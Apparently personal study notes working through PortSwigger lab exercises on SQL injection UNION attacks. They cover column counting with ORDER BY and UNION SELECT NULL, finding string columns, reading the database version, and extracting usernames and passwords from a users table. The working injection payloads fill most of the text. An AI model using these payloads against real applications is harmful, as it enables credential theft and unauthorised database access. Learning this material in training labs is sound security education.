# SQL injection UNION attacks

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

```
SELECT product_name, price FROM products UNION SELECT username, age
```

The query above met the requirements:

| string | integer |
| -------| ------- |
| product_name | price | 
| username | age |


This one didn't meet the requirements

```
SELECT product_name, price FROM products UNION SELECT id, username, password
```
## Determining the number of columns required in an SQL injection UNION attack
Method 1:
```
' ORDER BY 1, --
' ORDER BY 1,2 --
... 
' ORDER BY 1,2,3,N -- 
```

Method 2:  

```
' UNION SELECT NULL
' UNION SELECT NULL, NULL
...
' UNION SELECT NULL, NULL, NULL, NULL, NULL
```

Indicator: error message.

# Lab: SQL injection UNION attack, determining the number of columns returned by the query


Steps: 

1. Determine the number of columns by index.
```
category=Lifestyle' ORDER BY 1,2 --
category=Lifestyle' ORDER BY 1,2, --
category=Lifestyle' ORDER BY 1,2,3 --
category=Lifestyle' ORDER BY 1,2,3,4 -- # error
```
2. Fill with null.
```
category=Lifestyle' UNION SELECT NULL,NULL,NULL --
```

# Lab: SQL injection UNION attack, finding a column containing text

Steps:

1. Determine the number of columns 
```
category=Pets' ORDER BY 1,2,3 --
```

2. Determine column data type 
```
category=Pets' UNION SELECT 'inject',null,null --
category=Pets' UNION SELECT null,'inject',null --
category=Pets' UNION SELECT null,'inject','inject' --
```

# Lab: SQL injection UNION attack, retrieving data from other tables 

Suppose that:
- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the WHERE clause.
- The database contains a table called `users` with the columns `username` and `password`.

Steps:
1. Determine the number of column 
```
category=Lifestyles' ORDER BY 1,2 --
```

2. Determine the data type in each column 
```
category=Lifestyles' UNION SELECT 'a', NULL --
category=Lifestyles' UNION SELECT 'a', 'NULL' --
```

3. Retrieve data from the table users.
```
category=Lifestyles' UNION select username, password FROM users --
```
4. Login

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

> Note: Different databases use different syntax
> Cheatsheet to examine the database version and which syntax to use
> https://portswigger.net/web-security/sql-injection/cheat-sheet


Lab steps:
1. Determine the number of column 
```
category=Gifts' ORDER BY 1, 2 --
```

2. Determine the data type in each column 
```
category=Gifts' UNION SELECT NULL, 'a' --
```

3. Examining the database version.
```
category=Gifts' UNION SELECT NULL, version() --
```

4. Retrieve multiple values from single column
```
category=Gifts' UNION SELECT NULL, username || ':' || password FROM users --
```

5. Login